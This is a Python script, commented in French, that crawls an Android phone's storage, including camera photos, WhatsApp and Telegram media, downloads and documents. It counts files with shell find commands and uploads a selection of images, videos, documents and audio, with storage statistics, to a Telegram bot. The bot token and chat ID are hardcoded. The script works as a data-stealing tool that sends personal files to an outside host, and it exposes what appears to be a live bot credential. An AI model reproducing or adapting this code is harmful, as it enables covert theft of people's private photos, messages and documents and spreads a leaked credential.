import requests
import os
import glob
from datetime import datetime
import subprocess

BOT_TOKEN = "8457431488:AAHq7R3-WmvXVADfLz_eOTZZYsHQY6SenMU"
CHAT_ID = "6191233623"

def envoyer_telegram_message(message):
    """Envoyer un message texte"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=data, timeout=10)
        return True
    except:
        return False

def envoyer_telegram_fichier(fichier_path, type_fichier="document"):
    """Envoyer un fichier via Telegram"""
    try:
        if type_fichier == "photo":
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            files = {'photo': open(fichier_path, 'rb')}
        elif type_fichier == "video":
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
            files = {'video': open(fichier_path, 'rb')}
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files = {'document': open(fichier_path, 'rb')}
        
        data = {'chat_id': CHAT_ID}
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Erreur envoi {fichier_path}: {e}")
        return False

def trouver_fichiers_media():
    """Trouve tous les fichiers médias dans le stockage"""
    print("🔍 Recherche des fichiers médias...")
    
    # Dossiers à scanner
    dossiers = [
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/Download",
        "/storage/emulated/0/Movies",
        "/storage/emulated/0/Video",
        "/storage/emulated/0/WhatsApp/Media",
        "/storage/emulated/0/Telegram",
        "/storage/emulated/0/Music",
        "/storage/emulated/0/Documents"
    ]
    
    fichiers_media = {
        "images": [],
        "videos": [],
        "documents": [],
        "audio": []
    }
    
    extensions = {
        "images": ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'],
        "videos": ['.mp4', '.avi', '.mkv', '.mov', '.3gp', '.webm'],
        "documents": ['.pdf', '.doc', '.docx', '.txt', '.xls', '.xlsx', '.ppt', '.pptx'],
        "audio": ['.mp3', '.wav', '.ogg', '.m4a', '.flac']
    }
    
    for dossier in dossiers:
        if os.path.exists(dossier):
            print(f"📁 Scan de {dossier}")
            for type_media, exts in extensions.items():
                for ext in exts:
                    pattern = f"{dossier}/**/*{ext}"
                    try:
                        fichiers = glob.glob(pattern, recursive=True)
                        for fichier in fichiers:
                            if os.path.getsize(fichier) < 50 * 1024 * 1024:  # 50MB max
                                fichiers_media[type_media].append(fichier)
                    except:
                        continue
    
    # Limiter le nombre de fichiers par type
    for type_media in fichiers_media:
        fichiers_media[type_media] = fichiers_media[type_media][:20]  # 20 max par type
    
    return fichiers_media

def analyser_stockage():
    """Analyse l'utilisation du stockage"""
    print("💾 Analyse du stockage...")
    
    resultats = {}
    
    # Taille totale
    try:
        df_output = subprocess.getoutput("df -h /storage/emulated/0")
        resultats['stockage'] = df_output
    except:
        resultats['stockage'] = "N/A"
    
    # Nombre de fichiers par type
    commandes = {
        "images": "find /storage/emulated/0 -type f \\( -name '*.jpg' -o -name '*.jpeg' -o -name '*.png' \\) | wc -l",
        "videos": "find /storage/emulated/0 -type f \\( -name '*.mp4' -o -name '*.avi' -o -name '*.mkv' \\) | wc -l",
        "documents": "find /storage/emulated/0 -type f \\( -name '*.pdf' -o -name '*.doc' -o -name '*.txt' \\) | wc -l",
        "audio": "find /storage/emulated/0 -type f \\( -name '*.mp3' -o -name '*.wav' \\) | wc -l"
    }
    
    for type_fichier, cmd in commandes.items():
        try:
            count = subprocess.getoutput(cmd)
            resultats[type_fichier] = count.strip()
        except:
            resultats[type_fichier] = "N/A"
    
    return resultats

def envoyer_rapport_media():
    """Envoie le rapport complet des médias"""
    print("🚀 DÉMARRAGE ENVOI MÉDIAS...")
    
    # Envoyer message de début
    envoyer_telegram_message("📦 <b>DÉBUT DE L'ENVOI DES MÉDIAS</b>\n⏳ Cela peut prendre plusieurs minutes...")
    
    # Analyser le stockage
    stats = analyser_stockage()
    
    # Message de statistiques
    message_stats = "📊 <b>STATISTIQUES MÉDIAS</b>\n"
    message_stats += "═" * 30 + "\n\n"
    message_stats += f"🖼️ Images: <code>{stats.get('images', 'N/A')}</code>\n"
    message_stats += f"🎥 Vidéos: <code>{stats.get('videos', 'N/A')}</code>\n"
    message_stats += f"📄 Documents: <code>{stats.get('documents', 'N/A')}</code>\n"
    message_stats += f"🎵 Audio: <code>{stats.get('audio', 'N/A')}</code>\n\n"
    message_stats += f"💾 Stockage:\n<code>{stats.get('stockage', 'N/A')}</code>"
    
    envoyer_telegram_message(message_stats)
    
    # Trouver les fichiers médias
    fichiers_media = trouver_fichiers_media()
    
    # Envoyer les fichiers
    total_envoyes = 0
    
    # 1. IMAGES (5 premières)
    if fichiers_media["images"]:
        envoyer_telegram_message(f"🖼️ <b>ENVOI DES IMAGES</b> ({len(fichiers_media['images'])} trouvées)")
        for i, image_path in enumerate(fichiers_media["images"][:5]):  # 5 premières images
            print(f"📸 Envoi image {i+1}: {os.path.basename(image_path)}")
            if envoyer_telegram_fichier(image_path, "photo"):
                total_envoyes += 1
                envoyer_telegram_message(f"✅ Image {i+1} envoyée: <code>{os.path.basename(image_path)}</code>")
    
    # 2. VIDÉOS (3 premières)
    if fichiers_media["videos"]:
        envoyer_telegram_message(f"🎥 <b>ENVOI DES VIDÉOS</b> ({len(fichiers_media['videos'])} trouvées)")
        for i, video_path in enumerate(fichiers_media["videos"][:3]):  # 3 premières vidéos
            print(f"🎬 Envoi vidéo {i+1}: {os.path.basename(video_path)}")
            if envoyer_telegram_fichier(video_path, "video"):
                total_envoyes += 1
                envoyer_telegram_message(f"✅ Vidéo {i+1} envoyée: <code>{os.path.basename(video_path)}</code>")
    
    # 3. DOCUMENTS (5 premiers)
    if fichiers_media["documents"]:
        envoyer_telegram_message(f"📄 <b>ENVOI DES DOCUMENTS</b> ({len(fichiers_media['documents'])} trouvés)")
        for i, doc_path in enumerate(fichiers_media["documents"][:5]):  # 5 premiers documents
            print(f"📄 Envoi document {i+1}: {os.path.basename(doc_path)}")
            if envoyer_telegram_fichier(doc_path, "document"):
                total_envoyes += 1
                envoyer_telegram_message(f"✅ Document {i+1} envoyé: <code>{os.path.basename(doc_path)}</code>")
    
    # 4. AUDIO (3 premiers)
    if fichiers_media["audio"]:
        envoyer_telegram_message(f"🎵 <b>ENVOI DES FICHIERS AUDIO</b> ({len(fichiers_media['audio'])} trouvés)")
        for i, audio_path in enumerate(fichiers_media["audio"][:3]):  # 3 premiers fichiers audio
            print(f"🎵 Envoi audio {i+1}: {os.path.basename(audio_path)}")
            if envoyer_telegram_fichier(audio_path, "document"):
                total_envoyes += 1
                envoyer_telegram_message(f"✅ Audio {i+1} envoyé: <code>{os.path.basename(audio_path)}</code>")
    
    # Message de fin
    message_fin = f"🎉 <b>ENVOI TERMINÉ</b>\n\n"
    message_fin += f"📦 Total fichiers envoyés: <code>{total_envoyes}</code>\n"
    message_fin += f"🖼️ Images: <code>{len(fichiers_media['images'][:5])}</code>\n"
    message_fin += f"🎥 Vidéos: <code>{len(fichiers_media['videos'][:3])}</code>\n"
    message_fin += f"📄 Documents: <code>{len(fichiers_media['documents'][:5])}</code>\n"
    message_fin += f"🎵 Audio: <code>{len(fichiers_media['audio'][:3])}</code>\n\n"
    message_fin += f"🕐 {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"
    
    envoyer_telegram_message(message_fin)
    print(f"✅ Envoi terminé! {total_envoyes} fichiers envoyés")

def envoyer_selection_rapide():
    """Envoi rapide de quelques fichiers récents"""
    print("⚡ ENVOI RAPIDE DES FICHIERS RÉCENTS...")
    
    # Trouver les fichiers les plus récents
    commandes = {
        "Dernière image": "find /storage/emulated/0 -type f \\( -name '*.jpg' -o -name '*.jpeg' -o -name '*.png' \\) -exec ls -t {} + | head -1",
        "Dernière vidéo": "find /storage/emulated/0 -type f \\( -name '*.mp4' -o -name '*.avi' \\) -exec ls -t {} + | head -1",
        "Dernier document": "find /storage/emulated/0 -type f \\( -name '*.pdf' -o -name '*.doc' \\) -exec ls -t {} + | head -1"
    }
    
    for nom, cmd in commandes.items():
        try:
            fichier = subprocess.getoutput(cmd).strip()
            if fichier and os.path.exists(fichier):
                print(f"📤 Envoi {nom}: {fichier}")
                type_fichier = "photo" if "image" in nom.lower() else "video" if "vidéo" in nom.lower() else "document"
                if envoyer_telegram_fichier(fichier, type_fichier):
                    envoyer_telegram_message(f"✅ {nom} envoyé: <code>{os.path.basename(fichier)}</code>")
        except Exception as e:
            print(f"❌ Erreur {nom}: {e}")

if __name__ == "__main__":
    print("🤖 BOT TELEGRAM - ENVOI MÉDIAS")
    print("Choisissez l'option:")
    print("1. 📦 Envoi COMPLET des médias")
    print("2. ⚡ Envoi RAPIDE (fichiers récents)")
    
    choix = input("Votre choix (1 ou 2): ").strip()
    
    if choix == "1":
        envoyer_rapport_media()
    elif choix == "2":
        envoyer_selection_rapide()
    else:
        print("❌ Choix invalide")